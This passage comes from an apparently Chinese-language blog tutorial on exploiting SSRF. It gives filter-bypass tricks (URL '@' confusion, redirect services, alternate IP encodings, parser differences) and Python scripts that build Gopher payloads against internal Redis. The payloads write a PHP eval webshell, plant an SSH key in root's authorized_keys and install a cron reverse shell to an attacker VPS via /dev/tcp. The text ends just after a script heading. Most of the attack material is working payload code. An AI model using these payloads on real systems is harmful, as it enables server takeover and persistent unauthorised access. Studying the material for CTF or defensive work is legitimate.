<li>屏蔽返回的详细信息。<h3 id="利用HTTP基本身份认证的方式绕过"><a href="#利用HTTP基本身份认证的方式绕过" class="headerlink" title="利用HTTP基本身份认证的方式绕过"></a>利用HTTP基本身份认证的方式绕过</h3>如果目标代码限制访问的域名只能为 <a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> ，那么我们可以采用HTTP基本身份认证的方式绕过。即@：<a href="http://www.xxx.com@www.evil.com" target="_blank" rel="noopener">http://www.xxx.com@www.evil.com</a><br><img src= "/img/loading.gif" data-src="/img/SSrf/13.png" alt=""><h3 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h3>1、网络上存在一个很神奇的服务，网址为 <a href="http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子" target="_blank" rel="noopener">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子</a><br>当我们访问：<a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a> 时，实际上访问的是<a href="http://127.0.0.1/index.php" target="_blank" rel="noopener">http://127.0.0.1/index.php</a> 。像这种网址还有<a href="http://nip.io，http://sslip.io" target="_blank" rel="noopener">http://nip.io，http://sslip.io</a> 。</li>
</ul>
<p><img src= "/img/loading.gif" data-src="/img/SSrf/14.png" alt=""><br>2、短地址跳转绕过，这里也给出一个网址 <a href="https://4m.cn/：" target="_blank" rel="noopener">https://4m.cn/：</a><br><img src= "/img/loading.gif" data-src="/img/SSrf/15.png" alt=""><br>直接使用生成的短连接 <a href="https://4m.cn/FjOdQ" target="_blank" rel="noopener">https://4m.cn/FjOdQ</a> 就会自动302跳转到 <a href="http://127.0.0.1/flag.php" target="_blank" rel="noopener">http://127.0.0.1/flag.php</a> 上，这样就可以绕过WAF了</p>
<h3 id="进制的转换绕过内网IP"><a href="#进制的转换绕过内网IP" class="headerlink" title="进制的转换绕过内网IP"></a>进制的转换绕过内网IP</h3><p>可以使用一些不同的进制替代ip地址，从而绕过WAF，这里给出个从网上扒的php脚本可以一键转换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$ip = explode(<span class="string">'.'</span>,$ip);</span><br><span class="line">$r =($ip[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | ($ip[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | ($ip[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | $ip[<span class="number">3</span>] ;<span class="keyword">if</span>($r &lt; <span class="number">0</span>) &#123;    $r += <span class="number">4294967296</span>;&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"十进制:"</span>;     <span class="comment">// 2130706433</span></span><br><span class="line"><span class="keyword">echo</span> $r;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"八进制:"</span>;     <span class="comment">// 0177.0.0.1</span></span><br><span class="line"><span class="keyword">echo</span> decoct($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"十六进制:"</span>;   <span class="comment">// 0x7f.0.0.1</span></span><br><span class="line"><span class="keyword">echo</span> dechex($r);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="其他各种指向127-0-0-1的地址"><a href="#其他各种指向127-0-0-1的地址" class="headerlink" title="其他各种指向127.0.0.1的地址"></a>其他各种指向127.0.0.1的地址</h3><blockquote>
<p><a href="http://localhost/" target="_blank" rel="noopener">http://localhost/</a>         # localhost就是代指127.0.0.1<br><a href="http://0/" target="_blank" rel="noopener">http://0/</a>                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br><a href="http://0.0.0.0/" target="_blank" rel="noopener">http://0.0.0.0/</a>       # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行<br>http://[::]:80/           # 在liunx下可用，window测试了下不行<br><a href="http://127。0。0。1/" target="_blank" rel="noopener">http://127。0。0。1/</a>       # 用中文句号绕过<br>http://①②⑦.⓪.⓪.①<br><a href="http://127.1/" target="_blank" rel="noopener">http://127.1/</a><br><a href="http://127.00000.00000.001/" target="_blank" rel="noopener">http://127.00000.00000.001/</a> # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p>
</blockquote>
<h3 id="利用不存在的协议头绕过指定的协议头"><a href="#利用不存在的协议头绕过指定的协议头" class="headerlink" title="利用不存在的协议头绕过指定的协议头"></a>利用不存在的协议头绕过指定的协议头</h3><p>file_get_contents()函数的一个特性，即当PHP的 file_get_contents() 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^https/is'</span>,$_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：<br><code>httpsssss://</code><br>此时 file_get_contents() 函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：<br><code>ssrf.php?url=httpsssss://../../../../../../1.txt</code><br><img src= "/img/loading.gif" data-src="/img/SSrf/16.png" alt=""><br>这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。</p>
<h3 id="利用URL的解析问题"><a href="#利用URL的解析问题" class="headerlink" title="利用URL的解析问题"></a>利用URL的解析问题</h3><p>该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》的分享。主要是利用readfile和parseurl函数的解析差异以及curl和parseurl解析差异来进行绕过。</p>
<p><strong>1、利用readfile和parse_url函数的解析差异绕过指定的端口</strong><br>代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://'</span>. $_GET[url];</span><br><span class="line">$parsed = parse_url($url);</span><br><span class="line"><span class="keyword">if</span>( $parsed[port] == <span class="number">80</span> )&#123;  <span class="comment">// 这里限制了我们传过去的url只能是80端口的</span></span><br><span class="line">  readfile($url);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：<br><img src= "/img/loading.gif" data-src="/img/SSrf/17.png" alt=""><br>成功读取了11211端口下的1.txt<br><img src= "/img/loading.gif" data-src="/img/SSrf/18.png" alt=""><br>从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。</p>
<p>这两个函数在解析host的时候也有差异，如下图：<br><img src= "/img/loading.gif" data-src="/img/SSrf/19.png" alt=""><br>readfile()函数获取的是@号后面一部分（evil.com），而parseurl()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中parseurl()函数对指定host的限制。</p>
<p><strong>2、利用curl和parse_url的解析差异绕指定的host</strong><br>原理如下<br><img src= "/img/loading.gif" data-src="/img/SSrf/20.png" alt=""><br>从上图中可以看到curl()函数解析的是第一个@后面的网址，而parseurl()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parseurl()函数对指定host的限制。<br>代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;<span class="comment">// 检查是否是内网ip</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">    safe_request_url($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上述代码中可以看到 <code>check_inner_ip</code>函数通过 <code>url_parse()</code>函数检测是否为内网IP，如果不是内网 IP ，则通过 <code>curl()</code> 请求 url 并返回结果，我们可以利用curl和parse_url解析的差异不同来绕过这里的限制，让 <code>parse_url()</code>处理外部网站网址，最后 curl() 请求内网网址。<br>paylaod如下：<br><code>ssrf.php?url=http://@127.0.0.1:80@www.baidu.com/1.txt</code><br><img src= "/img/loading.gif" data-src="/img/SSrf/21.png" alt=""><br>不过这个方法在Curl较新的版本里被修掉了，所以我们还可以使用另一种方法，即 0.0.0.0。0.0.0.0 这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过：<br><code>ssrf.php?url=http://0.0.0.0/flag.php</code><br>但是这只适用于Linux系统上，Windows系统的不行</p>
<h2 id="常见攻击方式"><a href="#常见攻击方式" class="headerlink" title="常见攻击方式"></a>常见攻击方式</h2><h3 id="Gopher协议再ssrf中的利用"><a href="#Gopher协议再ssrf中的利用" class="headerlink" title="Gopher协议再ssrf中的利用"></a>Gopher协议再ssrf中的利用</h3><p>Gopherus工具：<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a><br>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口。但在WWW出现后，Gopher失去了昔日的辉煌。</p>
<p>现在的Gopher协议已经很少有人再使用它了，但是该协议在SSRF中却可以发挥巨大的作用，可以说是SSRF中的万金油。由于Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面<br><strong>1、Gopher协议格式</strong><br><code>URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code><br><strong># 注意不要忘记后面那个下划线”<em>“，下划线”</em>“后面才开始接TCP数据流，如果不加这个”_”，那么服务端收到的消息将不是完整的，该字符可随意写。</strong></p>
<ul>
<li><p>gopher的默认端口是70</p>
</li>
<li><p>如果发起POST请求，回车换行需要使用 %0d%0a来代替 %0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p>
</li>
</ul>
<blockquote>
<p>那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：<br>抓取或构造HTTP数据包<br>URL编码、将回车换行符 %0a替换为 %0d%0a<br>发送符合gopher协议格式的请求</p>
</blockquote>
<p><strong>2、利用Gopher协议发送HTTP GET请求</strong><br>代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// echo.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello "</span>.$_GET[<span class="string">"whoami"</span>].<span class="string">"\n"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来我们构造payload。一个典型的GET型的HTTP包类似如下：<br><code>GET /echo.php?whoami=Bunny HTTP/1.1</code><br><code>host: 192.168.0.109</code><br>然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">"""GET /ssrf.php?whoami=Bunny HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.0.109</span></span><br><span class="line"><span class="string">"""</span>  </span><br><span class="line"><span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">'%0A'</span>,<span class="string">'%0D%0A'</span>)</span><br><span class="line">result = <span class="string">'gopher://192.168.0.109:80/'</span>+<span class="string">'_'</span>+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-src="/img/SSrf/22.png" alt=""></p>
<blockquote>
<p>注意这几个问题：<br>问号（?）需要转码为URL编码，也就是%3f<br>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>
</blockquote>
<p>然后执行:<br><code>curl gopher://192.168.0.109:80/_GET%20/ssrf.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%20192.168.0.109%0D%0A</code><br><img src= "/img/loading.gif" data-src="/img/SSrf/23.png" alt=""><br>成功用GET方法传参并输出“Hello Bunny”<br><strong>3、利用Gopher协议发送HTTP POST请求</strong><br>代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo <span class="string">"Hello "</span>.$_POST[<span class="string">"whoami"</span>].<span class="string">"\n"</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>接下来我们构造payload。一个典型的POST型的HTTP包类似如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /ssrf.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.0</span><span class="number">.109</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">12</span></span><br><span class="line"></span><br><span class="line">whoami=Bunny</span><br></pre></td></tr></table></figure>
<p><strong>注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami=Bunny”的长度</strong><br>最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">"""POST /ssrf.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.0.109</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 12</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">whoami=Bunny</span></span><br><span class="line"><span class="string">"""</span>  </span><br><span class="line"><span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">'%0A'</span>,<span class="string">'%0D%0A'</span>)</span><br><span class="line">result = <span class="string">'gopher://192.168.0.109:80/'</span>+<span class="string">'_'</span>+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-src="/img/SSrf/24.png" alt=""><br>成功用POST方法传参并输出“Hello Bunny”。</p>
<h3 id="攻击内网Redis"><a href="#攻击内网Redis" class="headerlink" title="攻击内网Redis"></a>攻击内网Redis</h3><p><strong>Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</strong></p>
<blockquote>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。<br>简单说，漏洞的产生条件有以下两点：</p>
<ul>
<li>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li>
<li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li>
</ul>
</blockquote>
<p>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。</p>
<h4 id="绝对路径写shell"><a href="#绝对路径写shell" class="headerlink" title="绝对路径写shell"></a>绝对路径写shell</h4><p><strong>生成的Gopher协议若是通过GET传参，需要对其进行url二次编码</strong><br>所需redis命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">flushall</span><br><span class="line">set <span class="number">1</span> <span class="string">'&lt;?php eval($_POST["whoami"]);?&gt;'</span></span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"192.168.52.131"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_POST[\"whoami\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">   <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">   <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">   <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">   <span class="string">"save"</span></span><br><span class="line">   ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">  cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">  CRLF=<span class="string">"\r\n"</span></span><br><span class="line">  redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">  cmd=<span class="string">""</span></span><br><span class="line">  cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">    cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">  cmd+=CRLF</span><br><span class="line">  <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += urllib.quote(redis_format(x))</span><br><span class="line">  <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
<h4 id="写入SSH公钥"><a href="#写入SSH公钥" class="headerlink" title="写入SSH公钥"></a>写入SSH公钥</h4><p>可以直接这个存在Redis未授权的主机的<del>/.ssh目录下写入SSH公钥，直接实现免密登录，但前提是</del>/.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录</p>
<p>所需redis命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">flushall</span><br><span class="line">set <span class="number">1</span> <span class="string">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami</span></span><br><span class="line"><span class="string">'</span></span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"192.168.52.131"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">ssh_pub=<span class="string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\n\n"</span></span><br><span class="line">filename=<span class="string">"authorized_keys"</span></span><br><span class="line">path=<span class="string">"/root/.ssh/"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">   <span class="string">"set 1 &#123;&#125;"</span>.format(ssh_pub.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">   <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">   <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">   <span class="string">"save"</span></span><br><span class="line">   ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">  cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">  CRLF=<span class="string">"\r\n"</span></span><br><span class="line">  redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">  cmd=<span class="string">""</span></span><br><span class="line">  cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">    cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">  cmd+=CRLF</span><br><span class="line">  <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += urllib.quote(redis_format(x))</span><br><span class="line">  <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
<h4 id="创建计划任务反弹shell"><a href="#创建计划任务反弹shell" class="headerlink" title="创建计划任务反弹shell"></a>创建计划任务反弹shell</h4><p><strong>注意：这个只能在Centos上使用，别的不行，好像是由于权限的问题。</strong><br>所需redis命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">set <span class="number">1</span> <span class="string">'\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\n\n'</span></span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">// <span class="number">47.</span>xxx.xxx<span class="number">.72</span>为攻击者vps的IP</span><br></pre></td></tr></table></figure>
<p>python脚本：</p>
